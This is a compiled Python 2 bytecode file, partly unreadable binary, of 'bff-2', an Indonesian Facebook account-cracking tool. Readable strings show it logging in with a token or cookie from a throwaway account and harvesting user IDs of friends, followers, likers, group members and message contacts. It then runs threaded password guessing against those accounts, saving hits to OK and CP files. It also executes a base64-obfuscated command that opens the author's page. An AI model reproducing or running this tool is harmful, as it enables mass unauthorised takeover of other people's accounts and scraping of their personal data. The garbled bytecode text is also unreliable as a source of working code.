ó
HÞoac           @   s  d  Z  d Z d e  e f Z d d l Z y d d l Z Wn e k
 rX e j d  n Xy d d l Z Wn e k
 r e j d  n Xy d d l	 Z	 Wn e k
 rº e j d  n Xd d l Z d d l Z d d l
 Z
 d d l	 Z	 d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l m Z d d	 l	 m Z d d
 l m Z d d l m Z e j   Z e j Z d d d d d d d d d d d d g Z y0 e d k  pîe d k rûe   n  e d Z Wn e  k
 r e   n Xe j   Z! e! j" Z# e e Z$ e! j% Z& e! j Z' d e# e$ e& f Z( i d d 6d d 6d d 6d d 6d d  6d d! 6d d" 6d d# 6d d$ 6d d% 6d d& 6d d' 6Z) e* e  e j+ d(  d) Z, d  Z- d* Z. d+ Z/ d, Z0 d- Z1 d. Z2 d Z3 e, e- e. e/ e0 e1 e2 g Z4 e j5 e4  Z6 d/ Z7 g  g  g  g  d f \ a8 a9 Z: Z; a< d0   Z= d1   Z> d2   Z? d3   Z@ e jA d4  jB ZC d5   ZD i eE e jF d6 d7   d8 6eE e jF d9 d:   d; 6eE e jF d9 d:   d< 6d= d> 6d? d@ 6dA dB 6dC dD 6dE dF 6ZG dG   ZH dH ZI dI ZJ i dJ dK 6dL dM 6dN dO 6eJ dB 6dP dQ 6dR dS 6dT dU 6ZK dV   ZL eM dW  ZN dX   ZO dY   ZP dZ   ZQ d[   ZR eG d\  ZS eG d]  ZT eG d^  ZU d_ f  d`     YZV da   ZW db   ZX dc   ZY dd f  de     YZZ df   Z[ dg   Z\ dh f  di     YZ] dj   Z^ dk   Z_ dl   Z` dm   Za dn   Zb do   Zc dp   Zd dq   Ze ef dr k re j ds  e@   e=   n  d S(t   s   [1;92ms   [0ms
  %s
 â¢ Info script :
 	
 - author      : Romi Afrizal
 - facebook    : facebook.com/romi.afrizal.102
 - fanspage    : facebook.com/100022086172556
 - whatsap     : +6282371648186
 - github      : github.com/Mark-Zuck
 - script name : bff-2
 - version     : 1.1
 
%siÿÿÿÿNs   pip2 install requestss   pip2 install futuress   pip2 install bs4(   t   ThreadPoolExecutor(   t   BeautifulSoup(   t   sleep(   t   datetimet   Januarit   Februarit   Marett   Aprilt   Meit   Junit   Julit   Agustust	   Septembert   Oktobert   Novembert   Desemberi    i   i   s   %s-%s-%st   01t   02t   03t   04t   05t   06t   07t   08t   09t   10t   11t   12s   utf-8s   [1;91ms   [1;93ms   [1;94ms   [1;95ms   [1;96ms   [1;97ms   â¢c          C   s   y t  d d  j   }  WnE t k
 r` t j d  d t GHt d  t j d  t   n Xt j j	 d  r} t
   n t   d  S(   Ns   data/lisensi.txtt   rt   clears   %sâ¢ Lisensi kadaluarsai   s   rm -rf data/lisensi.txt(   t   opent   readt   IOErrort   ost   systemt   Mt   jedat
   konfirmasit   patht   existst   konfirmasi1(   t   lis(    (    s   /sdcard/bff.pyt   konfir[   s    	

c         C   s@   x9 |  d D]- } t  j j |  t  j j   t d  q Wd  S(   Ns   
g¸ëQ¸?(   t   syst   stdoutt   writet   flushR$   (   t   zt   e(    (    s   /sdcard/bff.pyt   jalank   s    c          C   sL   d d d g }  x6 |  D]. } d t  t | f Gt j j   t d  q Wd  S(   Ns   .   s   ..  s   ... s   %s%s menghapus token %si   (   R#   t   tilR+   R,   R.   R$   (   t   titikt   o(    (    s   /sdcard/bff.pyt   tikr   s
    c          C   s   y t  j d  Wn n Xy t  j d  Wn n Xy t  j d  Wn n Xy  d }  t d d  j |   Wn n Xd  S(   Nt   OKt   CPt   datasË   Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]s   data/ua.txtt   w(   R!   t   mkdirR   R-   (   t   ua_(    (    s   /sdcard/bff.pyt   folderz   s"    s   https://api.ipify.orgc           C   sL   d t  t t  t t  t t  t t  t t t t t  t t t t t t  t f GHd  S(   NsQ   %s 
 Â© Group%s
 __________       _____.__ 
 \____    /____ _/ ____\__| %s> %sZona
   /     /\__  \\   __\|  | %s> %sAkun 
  /     /_ / __ \|  |  |  | %s>%s Facebook
 /_______ (____  /__|  |__| %s>%s Indonesia
         \/    \/ 
 %s[%s*%s] By : %sMUHAMAD BADRU WASIH
 %s[%s*%s] --------------------------------------
 [%s*%s] IP : %s%s
(   t   Ht   Kt   Pt   IP(    (    (    s   /sdcard/bff.pyt   banner   s    g    ÐsAg    8|As   x-fb-connection-bandwidthi N  i@  s   x-fb-sim-hnis   x-fb-net-hnit	   EXCELLENTs   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-types~   NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]s
   user-agents!   application/x-www-form-urlencodeds   content-typet   Ligers   x-fb-http-enginec          B   s\  e  j d  e   d e e e e e e e e e e e e f GHe d e	 e e e f  }  |  d k r d e e f GHe
   nÖ|  d+ k re d e e f  e d	 e	 e e e f  } | d k rÜ d
 e e f GHn  yh e j d |  j   d } d e e f GHe d  e d d  j |  e   e j d  d  UWqXe e f k
 r}d e e f GHe d  e   qXXn×|  d, k r)d e e f GHe d  d GHe d  d e e f GHe d  d e e f GHe d  d e GHe d  d e GHe d  d e e f GHe d  d e e f GHe d  d e e f GHe d  d GHe d  e d e e e e e e e f  } | d k r»d  e e f GHe d  e   qX| d- k rêd# e e f GHe d  e   qX| d. k rXd& e e f GHe d  e  j d'  e   qXn/ |  d/ k rBe
 d*  n d e e f GHe
   d  S(0   NR   sT   
%s%s%s 01 %sLogin via token 
%s%s%s 02%s Cara mendapatkan token 
%s%s%s 00 %sKeluars   
%s# %sPilih %s> %st    s   %s%s wrong input t   1R   s4   
%s!%s Wajib gunakan akun tumbal dilarang akun utamas   %s# %sToken %s> %ss   %s%s isi token kentod s-   https://graph.facebook.com/me?access_token=%st   names!   
%s%s Login succes, mohon tunggu i   s   data/token.txtR9   s`   b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ==s   %s%s Token invalid t   2R   s   
%s%s Berikut cara nya :s,    - siapkan akun facebook (wajib akun tumbal)s9    - loginkan akun facebook (tumbal) di browser %sChrome %ss:    - url alamat wajib %shttps://m.facebook.com %s(mode data)sY    - salin link : %shttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_s?   %s - taruh link tersebut di url alamat facebook lalu klik cari s4    - jika sudah, klik %stitik tiga %spojok kanan atas s%    - kemudian klik %sCari di Halaman %ss+    - ketik %sEAAAA %sakan muncul acces token.s$    - jika sudah jangan lupa di salin 
s!   %s%s%s Anda paham? %sy%s/%sn :%s s"   %s%s saya bertanya wajib di jawab t   yt   Ys   
%s%s selamat anda pintar :* t   nt   Ns   
%s%s anda sungguh tolol s%   xdg-open https://youtu.be/IG5QfdxRkeYt   0t   00s   
(   RE   R   (   RG   R   (   RH   RI   (   RJ   RK   (   RL   RM   (   R!   R"   RA   t   UR2   R>   t   OR#   t	   raw_inputR?   t   exitR1   t   requestst   gett   jsonR=   R$   R   R-   t   login_xxt   base64t	   b64decodet   KeyErrorR    t   masuk(   t   romt   romzt   namat   nanya(    (    s   /sdcard/bff.pyRY   «   sª    		
	





	
	




	




s   https://mbasic.facebook.coms{   NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+s   mbasic.facebook.comt   Hosts	   max-age=0s   cache-controlRE   s   upgrade-insecure-requestssU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8t   accepts   gzip, deflates   accept-encodings#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languagec           C   s[   t  j j d  rP t  j j d  d k rF t t d  j   j    St   n t   d  S(   Ns   data/cookiesi    (	   R!   R&   R'   t   getsizet   cvdR   R   t   stript   _romiXD_(    (    (    s   /sdcard/bff.pyt   __romz__  s
    
c         C   sý   |  t  k r! d t t t f GHn  t d t t t t f  } | d k rY t d t	  n  yk t
 |  } t |  t  k r§ t d d  j |  t d t t f  n d t t f GHt d t   Wn2 t k
 rø } d	 t t | f GHt d t	  n Xd  S(
   Ns3   
%s%s%s Supaya bekerja masukan cookie facebook andas   %s# %sCookie %s> %sRD   t   shows   data/cookiesR9   s*   %s%s login success, ketik: python2 bff.py s   %s%s login gagal.s   %s%s error : %s
(   t   TrueRN   R2   RO   RP   R?   R#   R>   Rc   t   FalseRa   t   kuehR   R-   RQ   R=   t	   Exception(   Re   t   ckt   cksR0   (    (    s   /sdcard/bff.pyRc     s$    	c         C   sÅ   t  } t j d d i
 d d 6d d 6d d 6d	 d
 6t d 6d j t j j d d   d 6d d 6d d 6d d 6d d 6d |  j } d | j	   k rÁ t
 } | t
 k rª t
 St d t t f  n  d  S(   Ns'   https://mbasic.facebook.com/profile.phpt   headerss   https://mbasic.facebook.comt   origins#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages   gzip, deflates   accept-encodingsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8R_   s
   user-agentRD   s	   ://(.*?)$R^   s:   https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8t   referers	   max-age=0s   cache-controlRE   s   upgrade-insecure-requestss!   application/x-www-form-urlencodeds   content-typet   cookiest   mbasic_logout_buttons   %s%s login gagal. (   Rg   RR   RS   t   uat   joint   bs4t   ret   findallt   textt   lowerRf   RQ   R#   R2   (   Ro   t   ft   b(    (    s   /sdcard/bff.pyRh   .  s     c          C   sr   t  }  i
 |  d 6d d 6d d 6d d 6t d 6d	 j t j j d
 |    d 6|  d d 6d d 6d d 6d d 6} | S(   NRm   s#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages   gzip, deflates   accept-encodingsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8R_   s
   user-agentRD   s	   ://(.*?)$R^   s   /login/?next&ref=dbl&fl&refid=8Rn   s	   max-age=0s   cache-controlRE   s   upgrade-insecure-requestss!   application/x-www-form-urlencodeds   content-type(   t   hostRq   Rr   Rs   Rt   Ru   (   t   hostsR   (    (    s   /sdcard/bff.pyt   hdcokA  s    

c         C   s   g  } x t  |  j    D]o } | d t |  j    d k rc | j | d d |  | d  q | j | d d |  | d d  q Wd j |  S(   Ni    i   t   =s   ; RD   (   t	   enumeratet   keyst   lent   appendRr   (   Ro   t   resultt   i(    (    s   /sdcard/bff.pyt   cvsP  s     $)c         C   s­   i  } yP xE |  j  d  D]4 } | j i | j  d  d | j  d  d 6 q W| SWnP xE |  j  d  D]4 } | j i | j  d  d | j  d  d 6 ql W| SXd  S(   Nt   ;R}   i   i    s   ; (   t   splitt   update(   Ro   R   R   (    (    s   /sdcard/bff.pyRa   [  s    22c      
   C   sú  y t  j d  Wn n Xy±d t t t t t f GHt d t t t t t f  } t	 j
 d | |  f  } t j | j  } d | d d j d d	  } t | d
  } t	 j
 d | |  f  } t j | j  } x | d d D] }	 t j |	 d d |	 d  | j |	 d d |	 d d  d t t t t t t t t   f Gt j j   t d  qç W| j   d t t | d f GHd t t t t t | f GHt d t t t t t f  t   Wn' t k
 rõ}
 t d t t f  n Xd  S(   Nt   dumps<   
%s%s %sKetik '%sme%s' jika ingin dump daftar teman sendiri s   %s%s %sTarget id%s > %ss-   https://graph.facebook.com/%s?access_token=%ss   dump/t
   first_names   .jsont    t   _R9   sH   https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%st   friendsR8   t   ids   <=>RF   s   
s!   %s%s%s mengumpulkan id%s >%s %s g{®Gázt?s   

%s%s Succes dump id dari %ss$   %s%s%s File dump tersimpan %s>%s %s s   
%s%s%s [%s Enter%s ] s   
%s%s gagal dump id(   R!   R:   RN   R2   RO   R=   RP   R#   R>   RR   RS   RT   t   loadsRv   t   replaceR   R   R   R-   t   strR   R+   R,   R.   R$   t   closet   menuRi   RQ   (   R[   Rl   t   idtt   gast   nmt   filet   bffR   R/   t   aR0   (    (    s   /sdcard/bff.pyt   publiki  s`    		!
		c      
   C   s  y t  j d  Wn n XyÏd t t t t t f GHt d t t t t t f  } t d t t t t t f  } t	 j
 d | |  f  } t j | j  } d | d d j d	 d
  } t | d  } t	 j
 d | | |  f  } t j | j  }	 x |	 d D] }
 t j |
 d d |
 d  | j |
 d d |
 d d  d t t t t t t t t   f Gt j j   t d  qW| j   d t t | d f GHd t t t t t | f GHt d t t t t t f  t   Wn' t k
 r} t d t t f  n Xd  S(   NR   s9   
%s%s %sKetik '%sme%s' jika ingin dump followers sendiri s   %s%s %sTarget id%s  > %ss   %s%s %sMaximal id%s > %ss-   https://graph.facebook.com/%s?access_token=%ss   dump/R   s   .jsonR   R   R9   sB   https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%sR8   R   s   <=>RF   s   
s!   %s%s%s mengumpulkan id%s >%s %s g{®Gázt?s%   

%s%s Succes dump followers dari %s s$   %s%s%s File dump tersimpan %s>%s %s s   
%s%s%s [%s Enter%s ] s   
%s%s gagal dump id(   R!   R:   RN   R2   RO   R=   RP   R#   R>   RR   RS   RT   R   Rv   R   R   R   R   R-   R   R   R+   R,   R.   R$   R   R   Ri   RQ   (   R[   Rl   R   t   batasR   R   R   R   R   R/   R   R0   (    (    s   /sdcard/bff.pyt	   followers  sj    			!
		c      
   C   sß  y t  j d  Wn n Xyd t t t f GHt d t t t t t f  } t d t t t t t f  } t j	 d | |  f  } g  } t
 j | j  } d | d j d d	  } t | d
  } x | d D] }	 | j |	 d d |	 d  | j |	 d d |	 d d  d t t t t t t t |   f Gt j j   t d  qÓ W| j   d t t f GHd t t t t t | f GHt d t t t t t f  t   Wn' t k
 rÚ}
 t d t t f  n Xd  S(   NR   s7   
%s%s %sPerlu di ingat postingan harus bersifat publik s   %s%s %sId post%s   > %ss   %s%s%s Nama file%s > %ss@   https://graph.facebook.com/%s/likes?limit=999999&access_token=%ss   dump/s   .jsonR   R   R9   R8   R   s   <=>RF   s   
s!   %s%s%s mengumpulkan id%s >%s %s g{®Gázt?s    

%s%s Succes dump id postingan s$   %s%s%s File dump tersimpan %s>%s %s s   
%s%s%s [%s Enter%s ] s   
%s%s gagal dump id(   R!   R:   RN   R2   RO   RP   R#   R>   RR   RS   RT   R   Rv   R   R   R   R-   R=   R   R   R+   R,   R.   R$   R   R   Ri   RQ   (   R[   Rl   R   t   simpanR   R   R/   R   R   R   R0   (    (    s   /sdcard/bff.pyt	   postinganØ  s`    		!
		t   groupc           B   s,   e  Z d    Z d   Z d   Z d   Z RS(   c         C   s'   g  |  _  | |  _ |  j   t   d  S(   N(   t   glistRo   t   manualRQ   (   t   selfRo   (    (    s   /sdcard/bff.pyt   __init__  s    		
c      	   C   s#  d t  t t f GHt d t  t t t t f  } | d k rJ |  j   nÕ t j t	 j
 d | d t   d |  j j d  } d | j d	  j j   k r³ t d
 t t f  nl i | d 6| j d	  j d 6|  _ |  j   d t  t t t t |  j j
 d  d d !f GH|  j d |  d  S(   NsH   
%s%s%s Perlu di ingat group harus bersifat publik atau wajib join groups   %s%s%s Id groups%s > %sRD   s#   https://mbasic.facebook.com/groups/Rl   Ro   s   html.parsers   konten tidakt   titlesI   %s%s input id grup yg valid goblok, id error, atau lu belom jooin di grupR   RF   s   %s%s%s Nama grup%s > %s%s..i    i   (   RN   R2   RO   RP   R#   R>   R    Rs   R   RR   RS   R|   Ro   Rv   t   findRw   RQ   t   listedRx   R=   t   dumps(   R¡   R   R   (    (    s   /sdcard/bff.pyR      s*    	4

c         C   sd   t  d t t t t t f  j d d  |  _ |  j d k rJ |  j   n  t	 |  j d  j
   d  S(   Ns   %s%s%s Nama file %s> %sR   R   RD   R9   (   RP   RN   R2   RO   R#   R>   R   t   flRx   R   R   (   R¡   (    (    s   /sdcard/bff.pyRx   .  s    	c      
   C   sõ  t  j t j | d |  j d t   j d  } d t t t	 t
 t t t t |  j  j   j     f GHt j j   t d  x | j d  D]} y|t t  j j d | j d d	 t j d	    d
 k r| j d d	 t } d | j d	  k rd j t  j j d | j d	    } t |  d k r>w q| t |  j  j   k r_w qt |  j d  j d | | j f  w qd j t  j j d | j d	    } t |  d k rÊw q| t |  j  j   k rëw qt |  j d  j d | | j f  n  Wq q q Xq Wx} | j d d	 t D]f } d | j k r<xN t ry |  j d | j d	   PWqTt k
 r} d | GHqTqTXqTWq<q<Wd t t f GHd t t t	 t
 t |  j f GHt d t t t	 f  t    d  S(   NRo   Rl   s   html.parsers7   %s%s%s mengumpulkan id %s> %s%s [1;97m- mohon tunggug{®Gázt?t   h3s   \/R   t   hrefi   s   profile.phpRD   s   profile\.php\?id=(.*?)&i    s   a+s   %s<=>%s
s   /(.*?)\?s   Lihat Postingan Lainnyas   https://mbasic.facebook.com/s   [1;91mâ¢%s, retrying...s#   

%s%s Succes dump id member group s$   %s%s%s File dump tersimpan %s>%s %s s   
%s%s%s kembali(!   Rs   R   RR   RS   Ro   R|   Rv   RN   R2   RO   R#   R=   R   R   R   R§   R   t
   splitlinesR+   R,   R.   R$   t   find_allRt   Ru   R¤   Rf   Rr   R-   R¦   Ri   RP   R   (   R¡   t   urlR   R   t   ogehR   R0   (    (    s   /sdcard/bff.pyR¦   8  sJ    0<
9' &' - 		(   t   __name__t
   __module__R¢   R    Rx   R¦   (    (    (    s   /sdcard/bff.pyR     s   			
c         C   s=   t  j j d  r5 t  j j d  d k r. t St Sn t Sd  S(   Ns   data/cookiesi    (   R!   R&   R'   R`   Rf   Rg   (   t   arg(    (    s   /sdcard/bff.pyt   cek   s
    c       	   C   s  d  }  d  } d  } t d  t k rx y; t d t t t t t t t	 f  } t
 |  }  t } Wq d GHt   q Xn t
 t d  j   j    }  t j d d |  d t   j } t t j j d |   d	 k rìt |   t k rt d
 t t f  n  | t k r&t d d  j |  n  t d t t t t t	 f  j d d  } d t t t t t t f GHt d t t t t t	 f  } | d  k r°d t t f GHt   n% | d! k rÕd t t f GHt   n  t | |  d |  n' y t j d  Wn n Xd GHt   d  S("   Ni   sG   
%s%s%s Supaya bekerja masukan cookie facebook anda
%s# %sCookie%s > %ss   [1;91mâ¢ invalid cookies   data/cookiess'   https://mbasic.facebook.com/profile.phpRo   Rl   t   logouti    s"   %s%s gagal saat mendeteksi bahasa.R9   s   
%s%s%s Nama file %s>%s R   R   s0   %s%s%s Example nama orang %s[ %sRomi Ganteng %s]s   %s%s%s Sett nama %s> %st   romit   Romit   ROMIs   Romi Afrizals   Romi afrizals   ROMI AFRIZALs   romi afrizals)   
%s%s anak anjing mau crack pake nama gw s   Romi Gantengs   Romi gantengs   ROMI GANTENGs   romi gantengs$   
%s%s memang ganteng dong abang Romis-   https://mbasic.facebook.com/search/people/?q=s   [1;91mâ¢ login fail!(   R³   R´   Rµ   s   Romi Afrizals   Romi afrizals   ROMI AFRIZALs   romi afrizal(   s   Romi Gantengs   Romi gantengs   ROMI GANTENGs   romi ganteng(    t   NoneR±   Rg   RP   RN   R2   RO   R?   R#   R>   Ra   Rf   t   dumpflR   R   Rb   RR   RS   R|   Rv   R   Rs   Rt   Ru   t   langRQ   R-   R   R=   t   namahR!   t   remove(   t   cvdst   cookiet   newR   t   simt   s(    (    s   /sdcard/bff.pyR·   ª  sl    	
!!			

c         C   s  t  |  d  t j t j | d | d t   j d  } x| j d d t D]ñ} d t	 t
 t t t t t t  |   j   j     f Gt j j   d t |  k rd	 t | d  k rÉ qP qt | d  } d
 | k r| j d  j d  j d d  } t j j d |  } t |  d k rd j |  } | t  |   j   k rZq}t  |  d  j d | | f  qqt j j d |  } | j d  j d  j d d  } t |  d k rd j |  } | t  |   j   k rõqt  |  d  j d | | f  qn  d | j k rP t |  | | d  qP qP Wd t t
 f GHd t	 t
 t t t |  f GHt d t	 t
 t t	 t f  t   d  S(   Ns   a+Ro   Rl   s   html.parserR   R©   s6   %s%s%s mengumpulkan id %s> %s%s [1;97m- mohon tunggus	   <img alt=s   home.phps   profile.phpt   imgt   alts   , profile pictureRD   s   /profile\.php\?id=(.*?)&i    s   %s<=>%s
s   /(.*?)\?s   Lihat Hasil Selanjutnyas%   

%s%s Succes dump id pencarian nama s$   %s%s%s File dump tersimpan %s>%s %s s   
%s%s%s [%s Enter%s ] (   R   Rs   R   RR   RS   R|   Rv   R«   Rf   RN   R2   RO   R#   R=   R   R   R   Rª   R+   R,   R.   R¤   R   Rt   Ru   Rr   R-   R¹   RP   R   (   R¾   R   Ry   R   t   gRF   t   dt   pk(    (    s   /sdcard/bff.pyR¹   ç  sX    -&$&$&		t   pesanc           B   s   e  Z d    Z d   Z RS(   c         C   sz   | |  _  t d t t t t t f  j d d  |  _ |  j d k rS t	 |  n  t
 |  j d  j   |  j d  d  S(   Ns   
%s%s%s Nama file%s >%s R   R   RD   R9   s$   https://mbasic.facebook.com/messages(   Ro   RP   RN   R2   RO   R#   R>   R   Rx   RÅ   R   R   R   (   R¡   Ro   (    (    s   /sdcard/bff.pyR¢     s    		c      
   C   s  t  |  j d  t j t j | d t   d |  j j d  } d t	 t
 t t t t t t  |  j  j   j     f GHt j j   t d  x| j d d t D]} d	 | j d  k r~t j j d
 | j d   } y xy t | j    D]e } |  j j d  | k rqø qø d | j j   k r7qø n  t  |  j d  j d | | j f  qø WWq~t k
 rz} q© q~Xn  d | j k r© |  j d | j d   q© q© Wd t t
 f GHd t	 t
 t t t |  j f GHt  d t	 t
 t t	 t f  t!   d  S(   Ns   a+Rl   Ro   s   html.parsers7   %s%s%s mengumpulkan id %s> %s%s [1;97m- mohon tunggug{®Gázt?R   R©   s   /messages/reads   cid\.c\.(.*?)%3A(.*?)&s    c_users   pengguna facebooks   %s<=>%s
s   Lihat Pesan Sebelumnyas   https://mbasic.facebook.com/s%   
%s%s Succes dump id pesan mesengger s$   %s%s%s File dump tersimpan %s>%s %s s   
%s%s%s [%s Enter%s ] ("   R   Rx   Rs   R   RR   RS   R|   Ro   Rv   RN   R2   RO   R#   R=   R   R   R   Rª   R+   R,   R.   R$   R«   Rf   Rt   Ru   t   listt   popRw   R-   Ri   R   RP   R   (   R¡   R¬   t   bsR   Rx   t   ipR0   (    (    s   /sdcard/bff.pyR   )  sJ    0*
.
!	(   R®   R¯   R¢   R   (    (    (    s   /sdcard/bff.pyRÅ     s   	c           C   sJ   d t  t t t f GHd t  t t t f GHd t  t t t f GHt   d  S(   Ns   
%s%s%s 01 %sGanti user agent s   %s%s%s 02 %sCek user agent s   %s%s%s 00 %sKembali (   RN   R2   R?   RO   R#   t   uas(    (    (    s   /sdcard/bff.pyt	   useragentU  s    			c       	   C   sÅ  t  d t t t t f  }  |  d k rK d t t f GHt d  t   nv|  d$ k rõd t t t t	 t t t t f GHd t t t t	 t f GHyDt  d	 t t t t t f  } | d k rá d
 t t f GHt d  t
   n² | d% k r/t d t t t f  t d  t j d  t d  t   nd | d& k rt j d d g  } t d d  j |  t d  d t	 t f GHt d  t
   n  t d d  j |  t d  d t	 t f GHt d  t
   WqÁt k
 rñt d  qÁXnÌ |  d' k ryi t d d  j   } t d  d t t t t	 | f GHt d  t  d  t t t t t f  t
   WqÁt k
 rd! t } qÁXn6 |  d( k r¡t
   n  d t t f GHt d  t   d  S()   Ns   
%s#%s Pilih%s >%s RD   s   %s%s isi yang benari   RE   R   sd   %s%s%s Ketik %sMy user agent%s di browser google chrome
%s%s%s untuk gunakan user agent anda sendiris=   %s%s%s Ketik %sCancel%s untuk gunakan user agent bawaan toolss   %s%s%s Enter user agent %s: %ss   %s%s isi yang benar s   my user agents   My User Agents   MY USER AGENTs   My user agents'   %s%s%s Anda akan di arahkan ke browser s@   am start https://www.google.com/search?q=My+user+agent>/dev/nullt   CANCELt   Cancelt   cancelsË   Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]s{   NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+s   .ua.txtR9   s$   
%s%s menggunakan user agent bawaan s   data/ua.txts#   
%s%s berhasil mengganti user agents   [1;91mâ¢ Error RG   R   R   s   %s%s%s user agent anda : %s%ss   
%s%s%s [%s Enter%s ] s   %s-RL   RM   (   RE   R   (   s   my user agents   My User Agents   MY USER AGENTs   My user agent(   RÌ   RÍ   RÎ   (   RG   R   (   RL   RM   (   RP   R?   RO   R#   R>   R2   R$   RÊ   RN   R=   R   R1   R!   R"   RË   t   randomt   choiceR   R-   t   KeyboardInterruptRQ   R   R    (   t   uRq   R;   (    (    s   /sdcard/bff.pyRÊ   e  s    	

			










	
	

t   ngentodc           B   s>   e  Z d    Z d   Z d   Z d   Z d   Z d   Z RS(   c         C   s   g  |  _  d  S(   N(   R   (   R¡   (    (    s   /sdcard/bff.pyR¢   ¸  s    c      	      s[  yb t  d t t t t f   _ t  j  j   j    _	 d t t t t
 t  j	  f GHWn1 d t GHt  d t t t t f  t   n Xt  d t t t t f  } | d k rÇd t t t t t t t t f GHxut rÃt  d	 t t t t f  } | d
 k rd t GHqâ t |  d k r:d t GHqâ d     f d    d t t t t f GHd t t t t t f GHd t t t t t f GHd t t t t
 t f GH  | j d   Pqâ Wn | d k r=d t t t t f GHd t t t t t f GHd t t t t t f GHd t t t t
 t f GH j   n d t GHt d  t   d  S(   Ns   
%sâ¢%s file dump %s> %ss   %sâ¢%s jumlah Id%s > %s%ss/   
%sâ¢ File dump tidak ada, dump id dulu kentods   
%sâ¢ %s[ %senter %s] s+   %sâ¢%s gunakan password manual? y/t%s > %sRI   RH   s3   
%sâ¢%s contoh%s >%s sayang%s,%spengen%s,%sngentots   %sâ¢%s password %s> %sRD   s   
%sâ¢ jangan kosong i   s"   
%sâ¢ password minimal 6 karakterc            s^  t  d t t t t f  } | d k r; d t GH    n| d k r@d t t t t t t t t f GHt	 d  d t t t t t t t t t t f
 GHt	 d  d	 t t f GHt	 d  t
 d
 d  R } xH  j D]= } y- | j d  d } | j  j | |   WqØ qØ XqØ WWd  QXt j  j  t d t  n| d k rEd t t t t t t t t f GHt	 d  d t t t t t t t t t t f
 GHt	 d  d	 t t f GHt	 d  t
 d
 d  R } xH  j D]= } y- | j d  d } | j  j | |   WqÝqÝXqÝWWd  QXt j  j  t d t  n| d k rJd t t t t t t t t f GHt	 d  d t t t t t t t t t t f
 GHt	 d  d	 t t f GHt	 d  t
 d
 d  R } xH  j D]= } y- | j d  d } | j  j | |   WqâqâXqâWWd  QXt j  j  t d t  n d t GH    d  S(   Ns   
%s#%s Pilih %s> %s RD   s   %sâ¢ isi yang benar kentod RE   R   s7   
%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txtgÉ?s:   %s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txts2   %s!%s crack berjalan, tekan CTRL+Z untuk berhenti
t   max_workersi   s   <=>i    s   %sâ¢ finishedRG   R   t   3R   s   
%sâ¢ isi yang benar kentod(   RE   R   (   RG   R   (   RÕ   R   (   RP   R?   RO   R#   R>   RN   R2   R=   t   waktuR$   R    R   R   t   submitt   b_apiR!   Rº   t   apkRQ   t   basict   mobil(   t   brutet   indt   logt   akunt   indo(   R    R¡   (    s   /sdcard/bff.pyR    ç  sÒ    		
	
	

	
	

	
	

	s;   
%sâ¢%s [ %spilih methode crack, silahkan coba satuÂ² %s]
s+   %sâ¢ %s01%s methode %sb-api %s(fast crack)s,   %sâ¢ %s02%s methode %smbasic %s(slow crack)s1   %sâ¢ %s03%s methode %smobile %s(very slow crack)t   ,t   Tt   ts;   
%sâ¢%s [ %spilih methode crack, silahkan coba satuÂ²%s ]
s   %sâ¢ Isi yang benar kentod i   (   RI   RH   (   Râ   Rã   (   RP   RN   RO   R#   R>   RÙ   R   R   Rª   R   R=   R   R   Rf   R¶   R?   R   t   langsungR$   (   R¡   t   unikerst   pwx(    (   R    R¡   s   /sdcard/bff.pyt   romiy»  s®    							o									
c         C   s2  t  d t t t t f  } | d k r> d t GH|  j   nð| d k rÝd t t t t t t t t	 f GHt
 d  d t t t t t t t t t t	 f
 GHt
 d  d	 t t f GHt
 d  t d
 d  ì } xâ |  j D]× } yÇ | j d  \ } } | j d  } t |  d k sPt |  d k sPt |  d k sPt |  d k rr| | d d | d d g } n | | d d | d d g } | j |  j | |  WqÛ qÛ XqÛ WWd  QXt j |  j  t d t  nQ| d k r|d t t t t t t t t	 f GHt
 d  d t t t t t t t t t t	 f
 GHt
 d  d	 t t f GHt
 d  t d
 d  ì } xâ |  j D]× } yÇ | j d  \ } } | j d  } t |  d k sït |  d k sït |  d k sït |  d k r| | d d | d d g } n | | d d | d d g } | j |  j | |  WqzqzXqzWWd  QXt j |  j  t d t  n²| d k rd t t t t t t t t	 f GHt
 d  d t t t t t t t t t t	 f
 GHt
 d  d	 t t f GHt
 d  t d
 d  ì } xâ |  j D]× } yÇ | j d  \ } } | j d  } t |  d k st |  d k st |  d k st |  d k r°| | d d | d d g } n | | d d | d d g } | j |  j | |  WqqXqWWd  QXt j |  j  t d t  n d t GH|  j   d  S(   Ns   
%s#%s Pilih %s>%s RD   s   %sâ¢ Isi yang benar kentod RE   R   s7   
